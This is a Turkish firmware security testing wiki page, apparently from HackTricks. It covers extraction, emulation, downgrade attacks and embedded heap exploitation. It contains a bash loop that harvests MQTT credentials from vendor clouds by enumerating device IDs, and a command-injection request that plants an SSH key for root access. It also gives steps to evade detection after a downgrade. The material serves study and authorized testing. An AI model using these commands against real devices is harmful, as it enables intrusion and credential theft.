# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, hardware bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte depolanır; böylece cihaz açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sisteminin başlatılmasını sağlar. Güvenlik açıklarını belirlemede firmware'i incelemek ve potansiyel olarak değiştirmek kritik bir adımdır.

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç aşağıdakilerle ilgili verilerin toplanmasını içerir:

- CPU mimarisi ve üzerinde çalıştığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Codebase metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuata uygunluk sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları çok değerlidir. Ayrıca mevcut open-source yazılım bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz imkanı sunar.

## **Firmware'i Edinme**

Firmware elde etmek, her birinin farklı bir karmaşıklık düzeyine sahip olduğu çeşitli yöntemlerle gerçekleştirilebilir:

- Kaynaktan (**doğrudan**) (geliştiriciler, üreticiler)
- Sağlanan talimatlardan **build etmek**
- Resmi destek sitelerinden **indirmek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularını kullanmak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** ortamlarına doğrudan erişmek
- **Güncellemeleri**, man-in-the-middle teknikleriyle yakalamak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarmak**
- Cihaz iletişimi içerisindeki güncelleme isteklerini **sniffing** ile izlemek
- **Hardcoded update endpoint**'lerini belirlemek ve kullanmak
- Bootloader veya ağ üzerinden **dump almak**
- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçlarını kullanarak depolama çipini **çıkarıp okumak**

### Yalnızca UART logları: flash içindeki U-Boot env üzerinden root shell zorlamak

UART RX yok sayılıyorsa (yalnızca loglar alınıyorsa), yine de **U-Boot environment blob**'ını offline olarak **düzenleyerek** bir init shell'i zorlayabilirsiniz:

1. SOIC-8 klipsi ve programmer (3.3V) kullanarak SPI flash'ı dump edin:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition'ını bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve **U-Boot env CRC32** değerini blob için yeniden hesaplayın.
3. Yalnızca env partition'ını yeniden flashlayın ve yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell'inin devre dışı bırakıldığı ancak env partition'ına harici flash erişimi üzerinden yazılabildiği embedded cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahipsiniz**; onu nasıl ele almanız gerektiğini anlamak için firmware hakkında bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar vardır:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Bu araçlarla fazla bir şey bulamazsanız `binwalk -E <bin>` kullanarak imajın **entropy** değerini kontrol edin; entropy düşükse şifrelenmiş olması pek olası değildir. Entropy yüksekse şifrelenmiş olması (veya bir şekilde sıkıştırılmış olması) muhtemeldir.

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanılabilir.

### Dosya Sistemini Alma

Önceki bölümde açıklanan `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini, **dosya sistemi türünün adını taşıyan bir klasör** içine çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, signature'ları içinde dosya sisteminin **magic byte** değerini bulundurmaz. Bu durumlarda binwalk'u kullanarak dosya sisteminin offset değerini bulun, sıkıştırılmış dosya sistemini binary'den **carve** edin ve aşağıdaki adımları kullanarak dosya sistemi türüne göre **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Aşağıdaki **dd command** komutunu çalıştırarak Squashfs filesystem'ını carve edin.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu ayrıntılı şekilde incelemek önemlidir. Bu süreç, firmware image'ından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

Binary dosyanın ( `<bin>` olarak adlandırılır) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar dosya türlerini tanımlamaya, string'leri çıkarmaya, binary verileri analiz etmeye ve partition ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
İmajın **şifreleme** durumunu değerlendirmek için `binwalk -E <bin>` ile **entropy** kontrol edilir. Düşük entropy, şifreleme olmadığını gösterirken yüksek entropy olası şifreleme veya sıkıştırmaya işaret eder.

**embedded files** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya inceleme amacıyla **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; bu işlem çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) yapılır. Ancak **binwalk**, eksik magic byte'lar nedeniyle dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bu işlem, dosya sisteminin offset'ini bulmak için `binwalk` kullanılmasını ve ardından dosya sistemini carve etmek için `dd` komutunun kullanılmasını içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ardından, filesystem türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel olarak çıkarmak için farklı komutlar kullanılır.

### Filesystem Analysis

Filesystem çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan network daemon'larına, hardcoded credential'lara, API endpoint'lerine, update server işlevlerine, derlenmemiş code'a, startup script'lerine ve offline analysis için compiled binary'lere dikkat edilir.

**İncelenecek önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı credential'ları için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için configuration ve script dosyaları
- Daha ayrıntılı analysis için embedded binary'ler
- Yaygın IoT cihazı web server'ları ve binary'leri

Filesystem içindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan çeşitli araçlar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binary'ler Üzerinde Security Checks

Filesystem içinde bulunan hem source code hem de compiled binary'ler güvenlik açıkları açısından dikkatle incelenmelidir. Unix binary'leri için **checksec.sh** ve Windows binary'leri için **PESecurity** gibi araçlar, exploit edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Derived URL token'ları aracılığıyla cloud config ve MQTT credential'larının elde edilmesi

Birçok IoT hub'ı, cihaz başına configuration bilgilerini şu biçime benzeyen bir cloud endpoint'inden alır:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında, `<token>` değerinin hardcoded bir secret kullanılarak cihaz ID'sinden local olarak türetildiğini görebilirsiniz; örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak temsil edilir

Bu tasarım, bir deviceId ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturmasına ve cloud config'i çekmesine olanak tanır; bu işlem çoğu zaman plaintext MQTT credential'larını ve topic prefix'lerini açığa çıkarır.

Practical workflow:

1) UART boot log'larından deviceId'yi çıkarın

- 3.3V UART adapter'ını (TX/RX/GND) bağlayın ve log'ları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın; örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- İkili dosyaları Ghidra/radare2'ye yükleyin ve config path ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT credentials'larını topla

- URL'yi oluşturun ve JSON'u curl ile çekin; secrets'ları çıkarmak için jq ile parse edin:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Düz metin MQTT ve zayıf topic ACL'lerini kötüye kullanma (varsa)

- Bakım topic'lerine subscribe olmak ve hassas olayları aramak için kurtarılan kimlik bilgilerini kullanın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir device ID'leri enumerate edin (ölçekli ve yetkilendirmeyle)

- Birçok ecosystem, vendor OUI/product/type byte'larını sıralı bir suffix ile birleştirir.
- Aday ID'leri iterate edebilir, token'ları türetebilir ve config'leri programmatically fetch edebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration gerçekleştirmeden önce her zaman açık yetki alın.
- Mümkün olduğunda hedef donanımı değiştirmeden secret'ları kurtarmak için emulation veya static analysis yöntemlerini tercih edin.


Firmware emulation süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis** işlemine tabi tutulmasını sağlar. Bu yaklaşım, donanım ya da architecture bağımlılıklarıyla ilgili zorluklarla karşılaşabilir; ancak root filesystem'ın veya belirli binary'lerin, Raspberry Pi gibi matching architecture ve endianness özelliklerine sahip bir cihaza ya da önceden oluşturulmuş bir virtual machine'e aktarılması, daha ileri testleri kolaylaştırabilir.

### Tekil Binary'leri Emulation ile Çalıştırma

Tek programları incelemek için programın endianness ve CPU architecture özelliklerini belirlemek kritik önem taşır.

#### MIPS Architecture ile Örnek

Bir MIPS architecture binary'sini emulation ile çalıştırmak için şu command kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını kurmak için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler için ise `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emulation için `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğer araçlar full firmware emulation'ı kolaylaştırır, süreci otomatikleştirir ve dynamic analysis'e yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada analysis için gerçek veya emulated bir device environment kullanılır. OS ve filesystem'a shell access'i korumak önemlidir. Emulation, hardware interactions'ı kusursuz şekilde taklit etmeyebilir; bu nedenle zaman zaman emulation'ın yeniden başlatılması gerekebilir. Analysis sırasında filesystem yeniden incelenmeli, exposed webpage'ler ve network service'ler exploit edilmeli ve bootloader vulnerabilities araştırılmalıdır. Olası backdoor vulnerabilities'ı belirlemek için firmware integrity test'leri kritik öneme sahiptir.

## Runtime Analysis Techniques

Runtime analysis, bir process veya binary ile kendi operating environment'ı içinde etkileşime girmeyi kapsar. Bunun için breakpoint ayarlamak ve fuzzing ile diğer teknikleri kullanarak vulnerabilities belirlemek amacıyla gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.

Full debugger bulunmayan embedded target'lar için cihaza **statically-linked bir `gdbserver` kopyalayın** ve remotely attach olun:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radyo yardımcı işlemcisi mesaj eşlemesi

IoT hub'larında RF stack'i genellikle bir **radyo MCU'su** ile bir Linux userland process'i arasında bölünür. Yararlı bir workflow, yolu eşlemektir:

1. Havada **RF frame'i**
2. Radyo MCU'su tarafındaki **controller parser'ı**
3. Linux'a aktarılan **serial/UART text veya TLV protocol'ü** (örneğin `/dev/tty*`)
4. Ana daemon'daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki reversing hedefi oluşturur. Controller binary radio frame'lerini `Group,Command,arg1,arg2,...` gibi bir textual protocol'e dönüştürüyorsa şunları ortaya çıkarın:

- **Message group'larını** ve dispatch table'larını
- Hangi mesajların **network'ten**, hangilerinin controller'ın kendisinden gelebileceğini
- Tam **manufacturer-specific discriminator field'larını** (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Hangi handler'ların yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebilir olduğunu

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine güvenip güvenmediğini kontrol edin. Böyleyse commissioning trafiğini sniff etmek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install code'ları bu exposure'ı azaltır; bu nedenle test edilen cihazın bunları gerçekten enforce edip etmediğini not edin.

### Manufacturer-specific protocol handler'ları ve FSM-gated erişilebilirlik

Vendor-specific Zigbee/ZCL command'ları, standartlaştırılmış cluster'lara göre genellikle daha iyi bir hedeftir; çünkü daha az battle-tested validation içeren **custom parsing code** ve internal **FSM**'lere aktarılırlar.

Pratik workflow:

- Command dispatcher'ı, **vendor-only handler**'ı bulana kadar reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table'larını ortaya çıkarın.
- Otomatik olarak ilerleyen **transitional state**'leri ve sonunda attacker-controlled state'i resetleyen veya free eden retry/error branch'lerini belirleyin.
- Buggy handler'ın her zaman erişilebilir olduğunu varsaymak yerine daemon'ı vulnerable state'e getirmek için hangi legitimate protocol exchange'lerinin gerektiğini doğrulayın.

Timing-sensitive protocol'ler için Python framework'ünden packet replay yapmak fazla yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**'leri, **attribute**'ları ve commissioning timing'ini ortaya çıkarabilmek için vendor-grade stack kullanan gerçek donanım üzerinde (örneğin bir **nRF52840**) legitimate device emüle etmektir.

### Embedded daemon'larda fragmented-download bug class'ı

**Fragmented blob/model/configuration download** işlemlerinde tekrarlanan bir firmware bug class'ı görülür:

1. **First fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile allocation yapar.
2. Sonraki fragment'lar yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** field'larını validate eder.
3. Copy işlemi, **original allocated size** ile karşılaştırma yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu durum saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation zorlamak için **small** declared total size içeren ilk geçerli fragment.
- **Expected offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- Fresh check'leri karşılayan, fakat başlangıçta allocate edilen buffer'ın yine de overflow etmesini sağlayan forged packet-local size.

Vulnerable path commissioning logic'in arkasında olduğunda exploitation, malformed fragment'ları göndermeden önce hedefi beklenen model-download veya blob-download state'ine sürmek için yeterli **device emulation** içermelidir.

### Protocol-driven `free()` trigger'ları

Embedded daemon'larda heap metadata exploitation'ı tetiklemenin en kolay yolu genellikle "cleanup'ı beklemek" değil, **protocol'ün kendi error handling'ini zorlamaktır**:

- FSM'i **retry** veya **error** state'lerine itmek için malformed follow-up fragment'lar gönderin.
- Retry threshold'u aşarak daemon'ın **context'i resetlemesini** ve corrupted buffer'ı free etmesini sağlayın.
- Process ilgisiz nedenlerle crash olmadan önce allocator-side primitive'leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yaklaşım, embedded Linux'taki **musl/uClibc/dlmalloc-like** allocator'lara karşı özellikle yararlıdır; chunk metadata'sını bozmak, unlink/unbin logic'ini bir write primitive'e dönüştürebilir. Kararlı bir pattern, gerçek bin pointer'larını hemen overwrite edip process'i crash ettirmek yerine, allocator traversal'ını **overflowed buffer** içinde hazırlanan **fake chunk**'lara yönlendirmek için bir **size field**'ı bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen vulnerabilities için bir PoC geliştirmek, hedef mimarinin ve lower-level language'lerde programming'in derinlemesine anlaşılmasını gerektirir. Embedded system'lerde binary runtime protection'lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin'ler + consolidation:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle fake chunk'ın check'lerden geçmesi gerekir (makul bir size, `fd = 0` ve çevredeki chunk'ların "in use" olarak görülmesi).
- **ASLR altındaki non-PIE binary'ler:** ASLR etkin ancak ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation'ı bir **function pointer table** üzerine yerleştirmek için zaten geçerli bir heap chunk header'ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser-stopping NUL:** JSON parse edildiğinde payload içindeki bir `\x00`, trailing attacker-controlled byte'ları stack pivot/ROP chain için korurken parsing'i durdurabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, executable shellcode'u bilinen bir mapping içine yerleştirip ona jump edebilir.

## Firmware Analizi için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış environment'lar sağlar.

## Firmware'i analiz etmek için hazır OS'ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak için tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu önceden yapılandırılmış bir environment sağlayarak size önemli ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemidir.

## Firmware Downgrade Attack'leri ve Insecure Update Mechanism'leri

Bir vendor firmware image'ları için cryptographic signature check'leri uygulasa bile, **version rollback (downgrade) protection** sıklıkla eksiktir. Boot veya recovery-loader, yalnızca embedded public key ile signature'ı doğruluyor ancak flash edilen image'ın *version* değerini (veya monotonic counter'ını) karşılaştırmıyorsa, saldırgan **hâlâ geçerli bir signature taşıyan daha eski ve vulnerable firmware'i** yasal olarak kurabilir ve böylece patched vulnerabilities'ı yeniden kullanılabilir hâle getirebilir.

Tipik attack workflow'u:

1. **Daha eski, signed bir image elde edin**
* Vendor'ın public download portal'ından, CDN'inden veya support site'ından alın.
* Companion mobile/desktop application'larından çıkarın (örneğin bir Android APK'sı içindeki `assets/firmware/` altında).
* VirusTotal, Internet archive'ları, forumlar vb. third-party repository'lerden edinin.
2. Image'ı mevcut herhangi bir update channel üzerinden **cihaza upload edin veya cihaza sunun**:
* Web UI, mobile-app API, USB, TFTP, MQTT vb.
* Birçok consumer IoT device, Base64-encoded firmware blob'larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini tetikleyen *unauthenticated* HTTP(S) endpoint'leri sunar.
3. Downgrade sonrasında newer release'te patched edilmiş bir vulnerability'yi exploit edin (örneğin daha sonra eklenen bir command-injection filter'ı).
4. Persistence elde edildiğinde tespit edilmekten kaçınmak için isteğe bağlı olarak en güncel image'ı yeniden flash edin veya update'leri disable edin.

### Örnek: Downgrade Sonrasında Command Injection
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Savunmasız (downgraded) firmware'de `md5` parametresi sanitisation uygulanmadan doğrudan bir shell komutuna birleştirildiğinden, arbitrary command injection mümkün hâle gelir (burada SSH key-based root access etkinleştiriliyor). Daha sonraki firmware sürümleri temel bir character filter ekledi, ancak downgrade protection bulunmaması düzeltmeyi etkisiz kılıyor.

### Mobile Apps'ten Firmware Çıkarma

Birçok vendor, companion mobile application cihazı Bluetooth/Wi-Fi üzerinden update edebilsin diye full firmware image'larını bu uygulamaların içine dahil eder. Bu package'lar genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi path'lerde unencrypted olarak saklanır. `apktool`, `ghidra` ve hatta yalnızca `unzip` gibi tool'lar, physical hardware'a dokunmadan signed image'ları çıkarmanıza olanak tanır.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot tasarımlarında yalnızca updater'a özgü anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** mekanizmasını yalnızca *updater* mantığı içinde uygular (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya userspace OTA agent). Eğer **bootloader** daha sonra yalnızca image signature/CRC kontrolü yapar ve partition table veya slot metadata bilgisine güvenirse rollback protection yine bypass edilebilir.

Tipik zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da saklanan değerle karşılaştırır ve daha eski signed image'ları reddeder.
- Bootloader bu ratchet değerini **parse etmez** ve boot işlemi öncesinde yalnızca header, CRC ve signature doğrulaması yapar.
- Slot activation bilgisi partition table'da veya slot başına generation counter olarak ayrı şekilde saklanır ve doğrulanan exact firmware digest'e cryptographically bound değildir.

Bu durum dual-slot sistemlerde bir **validate-one-image / boot-another-image** primitive oluşturur. Saldırgan, updater'ın güncel signed image kullanarak slot B'yi sonraki boot hedefi olarak işaretlemesini sağlayabiliyor ve reboot öncesinde slot B'yi tekrar overwrite edebiliyorsa bootloader yalnızca daha önce commit edilmiş slot metadata'sına güvendiği için downgraded image'ı yine boot edebilir.

Yaygın abuse pattern:

1. **Current signed** firmware'ı passive slot'a upload edin ve layout'un bu slotu sonraki active slot olarak işaretlemesi için normal validation/switch routine'i çalıştırın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot-preparation/erase routine'ine yeniden girin.
3. Updater'ın, az önce promote edilen **aynı physical slot'u** erase etmesi için stale boot-state veya stale slot-selection mantığını abuse edin.
4. Bu slot'a **daha eski ancak hâlâ signed** bir firmware yazın.
5. Ratchet'i enforce eden validation routine'ini atlayın ve doğrudan reboot edin.
6. Bootloader promoted slot'u seçer, yalnızca signature/integrity kontrolü yapar ve eski image'ı boot eder.

A/B update implementasyonlarını reverse ederken bakılacak noktalar:

- Başarılı bir switch sonrasında yenilenmeyen **boot-time flag'lerinden** türetilen slot selection.
- **Current committed layout** yerine stale state'e göre slot erase eden `prepare_passive_slot()` benzeri bir routine.
- Yalnızca bir **generation counter** / active flag artıran ve doğrulanan image hash'ini saklamayan `part_write_layout()` benzeri bir function.
- Userspace veya updater code içinde implement edilmiş, ancak ROM / bootloader / secure boot stages içinde bulunmayan ratchet kontrolleri.
- Slot içeriği silinip yeniden yazıldıktan sonra slotu bootable olarak işaretli bırakabilen erase veya recovery routine'leri.

### Update Logic'i Değerlendirme Checklist'i

* *Update endpoint*'in transport/authentication koruması yeterli mi (TLS + authentication)?
* Device, flashing işleminden önce **version number'larını** veya **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (örneğin signature'lar ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrol etmek yerine updater ile **aynı ratchet'i enforce ediyor mu**?
* Slot activation metadata'sı **validated firmware digest/version'a bound** mı, yoksa promotion sonrasında bir slot modify edilebilir mi?
* Slot switch başarılı olduktan sonra device reboot etmeye zorlanıyor mu, yoksa sonraki update/erase routine'lerine aynı session içinde hâlâ erişilebiliyor mu?
* Userland code ek sanity check'ler yapıyor mu (örneğin izin verilen partition map, model number)?
* *Partial* veya *backup* update flow'ları aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback attack'lerine karşı vulnerable'dır.

## Pratik yapmak için vulnerable firmware

Firmware'daki vulnerability'leri keşfetme pratiği yapmak için aşağıdaki vulnerable firmware project'lerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state'ten firmware decryption key'lerini kurtarma

Bir update image'ı küçük miktarda plaintext metadata ile yüksek entropy'li büyük bir blob'u bir arada içerdiğinde, herhangi bir brute-force işleminden önce container triage yapın:

